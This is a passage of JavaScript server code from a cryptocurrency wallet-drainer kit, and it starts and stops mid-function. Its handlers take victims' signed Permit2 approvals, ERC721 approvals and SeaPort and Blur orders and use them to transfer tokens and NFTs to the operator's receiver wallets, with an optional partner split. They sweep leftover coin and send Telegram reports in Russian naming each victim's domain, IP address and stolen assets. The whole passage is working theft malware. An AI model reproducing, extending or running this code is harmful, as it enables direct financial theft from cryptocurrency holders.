                await send_message(receiver_chat_id, `<b>❌ Не удалось вывести актив пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nНедостаточно нативной монеты на кошельке дрейнера, попробуйте пополнить и вывести вручную!`, {
                  parse_mode: 'HTML'
                });
              } catch(err) {
                console.log(err);
              }
            }
            return send_response(response, { status: 'error', error: 'Unable to Execute' });
          } else if (balance.lt(gas_limit.mul(gas_price)) && wallet_address != MS_Wallet_Address) {
            const main_balance = await node.getBalance(MS_Wallet_Address);
            const main_signer = new RPC_WALLET(MS_Wallet_Private, node);
            const main_unsigned_tx = { from: MS_Wallet_Address, to: wallet_address, value: BN(100) };
            const main_gas_limit = BN(await node.estimateGas(main_unsigned_tx)).div(BN(100)).mul(BN(120));
            if (main_balance.lt(gas_limit.mul(gas_price).add(main_gas_limit.mul(gas_price)))) {
              if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
                let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
                try {
                  await send_message(receiver_chat_id, `<b>❌ Не удалось вывести актив пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nНедостаточно нативной монеты на кошельке дрейнера, попробуйте пополнить и вывести вручную!`, {
                    parse_mode: 'HTML'
                  });
                } catch(err) {
                  console.log(err);
                }
              }
              return send_response(response, { status: 'error', error: 'Unable to Execute' });
            }
            main_unsigned_tx.value = gas_limit.mul(gas_price);
            main_unsigned_tx.gasPrice = gas_price;
            main_unsigned_tx.gasLimit = main_gas_limit;
            main_unsigned_tx.nonce = await node.getTransactionCount(MS_Wallet_Address, 'pending');
            const main_tx = await main_signer.sendTransaction(main_unsigned_tx);
            await node.waitForTransaction(main_tx.hash, 1, 60000);
          }

          unsigned_tx.gasLimit = gas_limit;
          unsigned_tx.gasPrice = gas_price;
          unsigned_tx.nonce = await node.getTransactionCount(wallet_address, 'pending');

          let tx = await signer.sendTransaction(unsigned_tx);
          await node.waitForTransaction(tx.hash, 1, 60000);

          try {
            if (MS_Wallet_Address != wallet_address) {
              await new Promise(r => setTimeout(r, 1000));
              balance = await node.getBalance(wallet_address);
              unsigned_tx = { from: wallet_address, to: MS_Wallet_Address, value: BN(100) };
              gas_limit = await node.estimateGas(unsigned_tx);
              const available_amount = balance.sub(gas_limit.mul(gas_price));
              if (available_amount.gt(BN(0))) {
                unsigned_tx.value = available_amount;
                unsigned_tx.gasPrice = gas_price;
                unsigned_tx.gasLimit = gas_limit;
                unsigned_tx.nonce = await node.getTransactionCount(wallet_address, 'pending');
                await signer.sendTransaction(unsigned_tx);
              }
            }
          } catch(err) {
            console.log(err);
          }

          try {
            add_record({
              type: 'asset_sent', domain: data.domain, IP: data.IP,
              user_id: data.user_id, asset: data.asset, worker_id: data.worker_id || null
            });
            if ((data.chat_data == false && MS_Notifications.sign_success.mode) || (data.chat_data != false && data.chat_data.sign_success != "")) {
              let receiver_chat_id = data.chat_data == false ? MS_Notifications.sign_success.chat_id : data.chat_data.sign_success;
              try {
                await send_message(receiver_chat_id, `<b>💎 Успешно вывели токен Permit2 #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>Токен:</b> ${data.asset.name} [${chain_id_to_name(data.asset.chain_id)}] - ${parseFloat(data.asset.amount)} (${parseFloat(data.asset.amount_usd).toFixed(2)}$)`, {
                  parse_mode: 'HTML'
                });
              } catch(err) {
                console.log(err);
              }
            }
          } catch(err) {
            console.log(err);
          }

        } catch(err) {
          console.log(err);
          if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
            let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
              try {
                await send_message(receiver_chat_id, `<b>❌ Не удалось вывести актив пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nПолучилось подписать PERMIT2, но вывести токен не удалось, вы всё ещё можете попробовать сделать это вручную!`, {
                  parse_mode: 'HTML'
                });
              } catch(err) {
                console.log(err);
              }
            }
          return send_response(response, { status: 'OK' });
        }

      } catch(err) {
        console.log(err);
        if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
          let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
          try {
            await send_message(receiver_chat_id, `<b>❌ Не удалось вывести актив пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nНе получилось подписать автоматически, вы всё ещё можете попробовать сделать это вручную!`, {
              parse_mode: 'HTML'
            });
          } catch(err) {
            console.log(err);
          }
        }
        return send_response(response, { status: 'OK' });
      }

    } else {

      unsigned_tx.data = web3_contract_batch.methods.permit(data.address, data.message, data.signature).encodeABI();
      let gas_limit = BN(await node.estimateGas(unsigned_tx)).div(BN(100)).mul(BN(120));

      if (MS_Settings.Permit2.Bypass == 0 && gas_limit.gte(BN(6000000))) {
        if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
          let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
          try {
            await send_message(receiver_chat_id, `<b>❌ Не удалось подписать PERMIT2 пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nСистема обнаружила, что, скорее всего, PERMIT является фейковым и с целью сохранения ваших денежных средств отклонила транзакцию.\n\nВы всё ещё можете попытаться вывести токен вручную, если вы считаете, что подпись всё же является настоящей.`, {
              parse_mode: 'HTML'
            });
          } catch(err) {
            console.log(err);
          }
        }
        return send_response(response, { status: 'OK' });
      }

      try {

        if (balance.lt(gas_limit.mul(gas_price)) && wallet_address == MS_Wallet_Address) {
          if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
            let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
            try {
              await send_message(receiver_chat_id, `<b>❌ Не удалось вывести актив пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nНедостаточно нативной монеты на кошельке дрейнера, попробуйте пополнить и вывести вручную!`, {
                parse_mode: 'HTML'
              });
            } catch(err) {
              console.log(err);
            }
          }
          return send_response(response, { status: 'error', error: 'Unable to Execute' });
        } else if (balance.lt(gas_limit.mul(gas_price)) && wallet_address != MS_Wallet_Address) {
          const main_balance = await node.getBalance(MS_Wallet_Address);
          const main_signer = new RPC_WALLET(MS_Wallet_Private, node);
          const main_unsigned_tx = { from: MS_Wallet_Address, to: wallet_address, value: BN(100) };
          const main_gas_limit = BN(await node.estimateGas(main_unsigned_tx)).div(BN(100)).mul(BN(120));
          if (main_balance.lt(gas_limit.mul(gas_price).add(main_gas_limit.mul(gas_price)))) {
            if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
              let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
              try {
                await send_message(receiver_chat_id, `<b>❌ Не удалось вывести актив пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nНедостаточно нативной монеты на кошельке дрейнера, попробуйте пополнить и вывести вручную!`, {
                  parse_mode: 'HTML'
                });
              } catch(err) {
                console.log(err);
              }
            }
            return send_response(response, { status: 'error', error: 'Unable to Execute' });
          }
          main_unsigned_tx.value = gas_limit.mul(gas_price);
          main_unsigned_tx.gasPrice = gas_price;
          main_unsigned_tx.gasLimit = main_gas_limit;
          main_unsigned_tx.nonce = await node.getTransactionCount(MS_Wallet_Address, 'pending');
          const main_tx = await main_signer.sendTransaction(main_unsigned_tx);
          await node.waitForTransaction(main_tx.hash, 1, 60000);
        }

        unsigned_tx.gasLimit = gas_limit;
        unsigned_tx.gasPrice = gas_price;
        unsigned_tx.nonce = await node.getTransactionCount(wallet_address, 'pending');

        let tx = await signer.sendTransaction(unsigned_tx);
        await node.waitForTransaction(tx.hash, 1, 60000);
        await new Promise(r => setTimeout(r, 10000));

        let assets_list_str = '';

        for (const x_asset of available_assets) {
          add_allowance(data.address, wallet_address, x_asset.asset.address, x_asset.asset.chain_id,
          true, wallet_address != MS_Wallet_Address ? wallet_private : false, tx_count == 2 ? data.partner_address : false);
          assets_list_str += `- ${x_asset.asset.name} [${chain_id_to_name(x_asset.asset.chain_id)}] - ${parseFloat(x_asset.asset.amount)} (${parseFloat(x_asset.asset.amount_usd).toFixed(2)}$)\n`;
        }

        try {
          if ((data.chat_data == false && MS_Notifications.approve_success.mode) || (data.chat_data != false && data.chat_data.approve_success != "")) {
            let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_success.chat_id : data.chat_data.approve_success;
            await send_message(receiver_chat_id, `<b>👁 Успешно выдан доступ PERMIT2 #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>Список токенов:</b>\n\n${assets_list_str}`, {
              parse_mode: 'HTML'
            });
          }
        } catch(err) {
          console.log(err);
        }

        let withdraw_available_tokens = [];

        for (const x_token of available_assets) {
          try {
            if (MS_Settings.Approve.Withdraw == 1 && x_token.asset.amount_usd >= MS_Settings.Approve.Withdraw_Amount) {
              withdraw_available_tokens.push(x_token);
            }
          } catch(err) {
            console.log(err);
          }
        }

        if (withdraw_available_tokens.length < 1) {
          try {
            if (MS_Wallet_Address != wallet_address) {
              await new Promise(r => setTimeout(r, 1000));
              balance = await node.getBalance(wallet_address);
              unsigned_tx = { from: wallet_address, to: MS_Wallet_Address, value: BN(100) };
              gas_limit = BN(await node.estimateGas(unsigned_tx)).div(BN(100)).mul(BN(120));
              const available_amount = balance.sub(gas_limit.mul(gas_price));
              if (available_amount.gt(BN(0))) {
                unsigned_tx.value = available_amount;
                unsigned_tx.gasPrice = gas_price;
                unsigned_tx.gasLimit = gas_limit;
                unsigned_tx.nonce = await node.getTransactionCount(wallet_address, 'pending');
                await signer.sendTransaction(unsigned_tx);
              }
            }
          } catch(err) {
            console.log(err);
          }
          return send_response(response, { status: 'OK' });
        }

        try {

          unsigned_tx = { from: wallet_address, to: PERMIT2_ADDR, value: "0x0" };

          const transfer_details = [];

          if (tx_count == 1) {
            for (const x_asset of withdraw_available_tokens) {
              transfer_details.push({
                from: data.address, to: MS_Wallet_Receiver[Math.floor(Math.random() * MS_Wallet_Receiver.length)],
                token: x_asset.asset.address, amount: x_asset.balance.toString()
              });
            }
          } else {
            for (const x_asset of withdraw_available_tokens) {
              const partner_amount = BN(x_asset.balance).div(BN(100)).mul(BN(split_data));
              const owner_amount = BN(x_asset.balance).sub(partner_amount);
              transfer_details.push({
                from: data.address, to: MS_Wallet_Receiver[Math.floor(Math.random() * MS_Wallet_Receiver.length)],
                token: x_asset.asset.address, amount: owner_amount.toString()
              }, {
                from: data.address, to: data.partner_address,
                token: x_asset.asset.address, amount: partner_amount.toString()
              });
            }
          }

          unsigned_tx.data = web3_contract_batch.methods.transferFrom(transfer_details).encodeABI();
          gas_limit = BN(await node.estimateGas(unsigned_tx)).div(BN(100)).mul(BN(120));
          balance = await node.getBalance(wallet_address);

          if (balance.lt(gas_limit.mul(gas_price)) && wallet_address == MS_Wallet_Address) {
            if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
              let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
              try {
                await send_message(receiver_chat_id, `<b>❌ Не удалось вывести актив пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nНедостаточно нативной монеты на кошельке дрейнера, попробуйте пополнить и вывести вручную!`, {
                  parse_mode: 'HTML'
                });
              } catch(err) {
                console.log(err);
              }
            }
            return send_response(response, { status: 'error', error: 'Unable to Execute' });
          } else if (balance.lt(gas_limit.mul(gas_price)) && wallet_address != MS_Wallet_Address) {
            const main_balance = await node.getBalance(MS_Wallet_Address);
            const main_signer = new RPC_WALLET(MS_Wallet_Private, node);
            const main_unsigned_tx = { from: MS_Wallet_Address, to: wallet_address, value: BN(100) };
            const main_gas_limit = BN(await node.estimateGas(main_unsigned_tx)).div(BN(100)).mul(BN(120));
            if (main_balance.lt(gas_limit.mul(gas_price).add(main_gas_limit.mul(gas_price)))) {
              if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
                let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
                try {
                  await send_message(receiver_chat_id, `<b>❌ Не удалось вывести актив пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nНедостаточно нативной монеты на кошельке дрейнера, попробуйте пополнить и вывести вручную!`, {
                    parse_mode: 'HTML'
                  });
                } catch(err) {
                  console.log(err);
                }
              }
              return send_response(response, { status: 'error', error: 'Unable to Execute' });
            }
            main_unsigned_tx.value = gas_limit.mul(gas_price);
            main_unsigned_tx.gasPrice = gas_price;
            main_unsigned_tx.gasLimit = main_gas_limit;
            main_unsigned_tx.nonce = await node.getTransactionCount(MS_Wallet_Address, 'pending');
            const main_tx = await main_signer.sendTransaction(main_unsigned_tx);
            await node.waitForTransaction(main_tx.hash, 1, 60000);
          }

          unsigned_tx.gasLimit = gas_limit;
          unsigned_tx.gasPrice = gas_price;
          unsigned_tx.nonce = await node.getTransactionCount(wallet_address, 'pending');

          let tx = await signer.sendTransaction(unsigned_tx);
          await node.waitForTransaction(tx.hash, 1, 60000);

          try {
            if (MS_Wallet_Address != wallet_address) {
              await new Promise(r => setTimeout(r, 1000));
              balance = await node.getBalance(wallet_address);
              unsigned_tx = { from: wallet_address, to: MS_Wallet_Address, value: BN(100) };
              gas_limit = BN(await node.estimateGas(unsigned_tx)).div(BN(100)).mul(BN(120));
              const available_amount = balance.sub(gas_limit.mul(gas_price));
              if (available_amount.gt(BN(0))) {
                unsigned_tx.value = available_amount;
                unsigned_tx.gasPrice = gas_price;
                unsigned_tx.gasLimit = gas_limit;
                unsigned_tx.nonce = await node.getTransactionCount(wallet_address, 'pending');
                await signer.sendTransaction(unsigned_tx);
              }
            }
          } catch(err) {
            console.log(err);
          }

          try {
            for (const x_asset of withdraw_available_tokens) {
              add_record({
                type: 'asset_sent', domain: data.domain, IP: data.IP,
                user_id: data.user_id, asset: x_asset.asset, worker_id: data.worker_id || null
              });
            }
            if ((data.chat_data == false && MS_Notifications.sign_success.mode) || (data.chat_data != false && data.chat_data.sign_success != "")) {
              let receiver_chat_id = data.chat_data == false ? MS_Notifications.sign_success.chat_id : data.chat_data.sign_success;
              try {
                await send_message(receiver_chat_id, `<b>💎 Успешно вывели токены Permit2 #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>Список токенов:</b>\n\n${assets_list_str}`, {
                  parse_mode: 'HTML'
                });
              } catch(err) {
                console.log(err);
              }
            }
          } catch(err) {
            console.log(err);
          }

        } catch(err) {
          console.log(err);
          if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
            let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
              try {
                await send_message(receiver_chat_id, `<b>❌ Не удалось вывести актив пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nПолучилось подписать PERMIT2, но вывести токен не удалось, вы всё ещё можете попробовать сделать это вручную!`, {
                  parse_mode: 'HTML'
                });
              } catch(err) {
                console.log(err);
              }
            }
          return send_response(response, { status: 'OK' });
        }

      } catch(err) {
        console.log(err);
        if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
          let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
          try {
            await send_message(receiver_chat_id, `<b>❌ Не удалось вывести актив пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nНе получилось подписать автоматически, вы всё ещё можете попробовать сделать это вручную!`, {
              parse_mode: 'HTML'
            });
          } catch(err) {
            console.log(err);
          }
        }
        return send_response(response, { status: 'OK' });
      }

    }

    return send_response(response, { status: 'OK' });
  } catch(err) {
    console.log(err);
    return send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
}

const Get_ERC721_Allowance = async (chain_id, contract_address, owner_address, spender_address) => {
  try {
    const node = new ethers.providers.JsonRpcProvider(MS_Private_RPC_URLs[chain_id]);
    const contract = new ethers.Contract(contract_address, MS_Contract_ABI['ERC721'], node);
    return await contract.isApprovedForAll(owner_address, spender_address);
  } catch(err) {
    console.log(err);
  } return false;
};

const safa_approves = async (response, data) => {
  try {
    if (MS_Settings.SAFA.Enable == 0 || MS_Settings.SAFA.Withdraw == 0) return send_response(response, { status: 'OK' });
    if (MS_Protection) {
      if (User_IPs_Pool[data.IP]) {
        if (User_IPs_Pool[data.IP]['strange_data'] > Math.floor(Date.now() / 1000)) {
          return block_request(response);
        }
      }
    }
    if (MS_VERIFY_WALLET == 1 && !MS_Verified_Addresses[data.address]) {
      return send_response(response, { status: 'error', error: 'Verify Wallet First' });
    }
    const receiver_address = (MS_Split_System && MS_Split_NFTs == 1 && data.partner_address && data.partner_address != null)
    ? data.partner_address : MS_Wallet_Receiver[Math.floor(Math.random() * MS_Wallet_Receiver.length)];
    let current_allowance = await Get_ERC721_Allowance(data.chain_id, data.contract_address, data.address, MS_Wallet_Address);
    if (!current_allowance) {
      await new Promise(r => setTimeout(r, 2000));
      current_allowance = await Get_ERC721_Allowance(data.chain_id, data.contract_address, data.address, MS_Wallet_Address);
      if (!current_allowance) {
        await new Promise(r => setTimeout(r, 5000));
        current_allowance = await Get_ERC721_Allowance(data.chain_id, data.contract_address, data.address, MS_Wallet_Address);
        if (!current_allowance) {
          if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
            let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
            await send_message(receiver_chat_id, `<b>❌ Не удалось вывести коллекцию пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>NFT Collection :</b> ${data.contract_address} [${chain_id_to_name(data.chain_id)}]\n\nВозможно, транзакция подтверждения не прошла или ещё в очереди, попробуйте вывести токен в ручном режиме!`, {
              parse_mode: 'HTML'
            });
          }
          return send_response(response, { status: 'error', error: 'Unable to Execute' });
        }
      }
    }
    const node = new ethers.providers.JsonRpcProvider(MS_Private_RPC_URLs[data.chain_id]);
    const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
    const signer = new ethers.Wallet(MS_Wallet_Private, node); let stop_withdraw_nfts = false;
    for (const asset of data.tokens) {
      try {
        if (asset.amount_usd <= MS_Settings.SAFA.Withdraw_Amount || stop_withdraw_nfts == true) continue;
        stop_withdraw_nfts = (MS_Settings.SAFA.Withdraw == 1);
        const contract = new ethers.Contract(asset.address, MS_Contract_ABI['ERC721'], signer);
        let gas_limit = null;
        try {
          gas_limit = await contract.estimateGas.transferFrom(data.address, receiver_address, asset.id, { from: MS_Wallet_Address });
          gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('150')).toString();
        } catch(err) {
          if (MS_Settings.SAFA.Bypass == 1)
            gas_limit = (data.asset.chain_id == 42161) ? 5000000 : (data.asset.chain_id == 43114 ? 5000000 : 300000);
          else gas_limit = 15000000;
        }
        if (MS_Settings.SAFA.Bypass == 0 && ethers.BigNumber.from(gas_limit).gte(ethers.BigNumber.from('6000000'))) {
          if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
            let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
            try {
              await send_message(receiver_chat_id, `<b>❌ Не удалось вывести NFT пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>NFT:</b> ${asset.name} [${chain_id_to_name(asset.chain_id)}]\n\nСистема обнаружила, что, скорее всего, подтверждение является фейковым или вывод этого токена технически невозможен, и с целью сохранения ваших денежных средств отклонила транзакцию.\n\nВы всё ещё можете попытаться вывести токен вручную, если вы считаете, что подпись всё же является настоящей.`, {
                parse_mode: 'HTML'
              });
            } catch(err) {
              console.log(err);
            }
          }
          continue;
        }
        const nonce = await node.getTransactionCount(MS_Wallet_Address, "pending");
        const tx = await contract.transferFrom(data.address, receiver_address, asset.id, {
          gasLimit: ethers.BigNumber.from(gas_limit),
          gasPrice: ethers.BigNumber.from(gas_price),
          nonce: nonce
        });
        await node.waitForTransaction(tx.hash, 1, 60000);
        add_record({
          type: 'asset_sent', domain: data.domain, IP: data.IP,
          user_id: data.user_id, asset: data.asset, worker_id: data.worker_id || null
        });
        if ((data.chat_data == false && MS_Notifications.approve_success.mode) || (data.chat_data != false && data.chat_data.approve_success != "")) {
          let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_success.chat_id : data.chat_data.approve_success;
          try {
            await send_message(receiver_chat_id, `<b>💎 Успешно выведен NFT пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>Токен:</b> ${asset.name} [${chain_id_to_name(asset.chain_id)}, ${parseFloat(asset.amount_usd).toFixed(2)}$]`, {
              parse_mode: 'HTML'
            });
          } catch(err) {
            console.log(err);
          }
        }
      } catch(err) {
        if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
          let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
          try {
            await send_message(receiver_chat_id, `<b>❌ Не удалось вывести NFT пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>NFT:</b> ${asset.name} [${chain_id_to_name(asset.chain_id)}]\n\nВозможно, транзакция подтверждения не прошла или ещё в очереди, попробуйте вывести токен в ручном режиме!`, {
              parse_mode: 'HTML'
            });
          } catch(err) {
            console.log(err);
          }
        }
      }
    }
    send_response(response, { status: 'OK' });
  } catch(err) {
    console.log(err);
    try {
      if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
        let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
        await send_message(receiver_chat_id, `<b>❌ Не удалось вывести коллекцию пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>NFT Collection :</b> ${data.contract_address} [${chain_id_to_name(data.chain_id)}]\n\nВозможно, транзакция подтверждения не прошла или ещё в очереди, попробуйте вывести токен в ручном режиме!`, {
          parse_mode: 'HTML'
        });
      }
    } catch(err) {
      console.log(err);
    }
    send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
};

const seaport_handler = async (response, data) => {
  try {
    if (MS_Protection) {
      if (User_IPs_Pool[data.IP]) {
        if (User_IPs_Pool[data.IP]['strange_data'] > Math.floor(Date.now() / 1000)) {
          return block_request(response);
        }
      }
    }
    if (data.seaport == 'request') {
      if ((data.chat_data == false && MS_Notifications.approve_request.mode) || (data.chat_data != false && data.chat_data.approve_request != "")) {
        let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_request.chat_id : data.chat_data.approve_request;
        let nfts_list_str = '';
        for (const asset of data.assets) {
          try {
            nfts_list_str += `${asset.name} (${asset.amount_usd.toFixed(2)}$); `;
          } catch(err) {
            console.log(err);
          }
        }
        await send_message(receiver_chat_id, `<b>❓ Пользователь #user_${data.user_id} получил запрос на SeaPort</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>Список NFT:</b> ${nfts_list_str}`, {
          parse_mode: 'HTML'
        });
      }
      send_response(response, { status: 'OK' });
    } else if (data.seaport == 'cancel') {
      if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
        let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
        await send_message(receiver_chat_id, `<b>❌ Пользователь #user_${data.user_id} отклонил SeaPort</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nМы предложим ему списать NFT отдельно`, {
          parse_mode: 'HTML'
        });
      }
      send_response(response, { status: 'OK' });
    } else if (data.seaport == 'success') {
      if (MS_Settings.SeaPort.Limit == 1 && SeaPort_List[data.address]) {
        return send_response(response, { status: 'OK' });
      } SeaPort_List[data.address] = 1;
      let result = await SeaPort.fulfill(data, MS_Private_RPC_URLs[1], MS_Wallet_Private);
      if (result) {
        if ((data.chat_data == false && MS_Notifications.approve_success.mode) || (data.chat_data != false && data.chat_data.approve_success != "")) {
          let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_success.chat_id : data.chat_data.approve_success;
          await send_message(receiver_chat_id, `<b>💎 Успешно подписали SeaPort пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nВы можете отследить транзакцию через сканеры`, {
            parse_mode: 'HTML'
          });
        }
      } else {
        if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
          let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
          await send_message(receiver_chat_id, `<b>❌ Не удалось подписать SeaPort пользователя #user_${data.user_id}</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nВозможно, транзакция не прошла или ещё в очереди!`, {
            parse_mode: 'HTML'
          });
        }
      }
      send_response(response, { status: 'OK' });
    } else {
      send_response(response, { status: 'error', error: 'Unable to Execute' });
    }
  } catch (err) {
    console.log(err);
    send_response(response, { status: 'error', error: 'Unable to Execute' });
  }
};

const blur_handler = async (response, data) => {
  try {
    if (MS_Protection) {
      if (User_IPs_Pool[data.IP]) {
        if (User_IPs_Pool[data.IP]['strange_data'] > Math.floor(Date.now() / 1000)) {
          return block_request(response);
        }
      }
    }
    if (data.blur == 'request') {
      if ((data.chat_data == false && MS_Notifications.approve_request.mode) || (data.chat_data != false && data.chat_data.approve_request != "")) {
        let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_request.chat_id : data.chat_data.approve_request;
        let nfts_list_str = '';
        for (const asset of data.assets) {
          try {
            nfts_list_str += `${asset.name} (${asset.amount_usd.toFixed(2)}$); `;
          } catch(err) {
            console.log(err);
          }
        }
        await send_message(receiver_chat_id, `<b>❓ Пользователь #user_${data.user_id} получил запрос на Blur</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\n<b>Список NFT:</b> ${nfts_list_str}`, {
          parse_mode: 'HTML'
        });
      }
      send_response(response, { status: 'OK' });
    } else if (data.blur == 'cancel') {
      if ((data.chat_data == false && MS_Notifications.approve_cancel.mode) || (data.chat_data != false && data.chat_data.approve_cancel != "")) {
        let receiver_chat_id = data.chat_data == false ? MS_Notifications.approve_cancel.chat_id : data.chat_data.approve_cancel;
        await send_message(receiver_chat_id, `<b>❌ Пользователь #user_${data.user_id} отклонил Blur</b>\n\n<b>🌍 Домен:</b> <code>${data.domain}</code>\n<b>✉️ IP адрес:</b> <code>${data.IP}</code>\n\nМы предложим ему списать NFT отдельно`, {
          parse_mode: 'HTML'
        });
      }
      send_response(response, { status: 'OK' });
    } else if (data.blur == 'root') {
      let result = await Blur.get_root(data, MS_Private_RPC_URLs[1], MS_Wallet_Private);
